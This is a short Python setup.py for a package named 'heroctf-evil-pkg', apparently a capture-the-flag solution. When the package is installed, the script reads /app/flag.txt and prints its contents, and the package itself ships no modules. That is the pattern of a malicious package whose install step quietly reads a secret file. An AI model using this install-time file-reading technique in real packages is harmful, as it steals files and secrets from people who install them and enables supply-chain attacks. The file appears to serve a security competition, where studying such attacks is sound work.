from setuptools import setup
import os

try:
    flag_path = "/app/flag.txt"
    if os.path.exists(flag_path):
        with open(flag_path, "r") as f:
            print(f.read())
except Exception as e:
    print(e)

setup(
    name="heroctf-evil-pkg",
    version="0.1",
    py_modules=[],
)
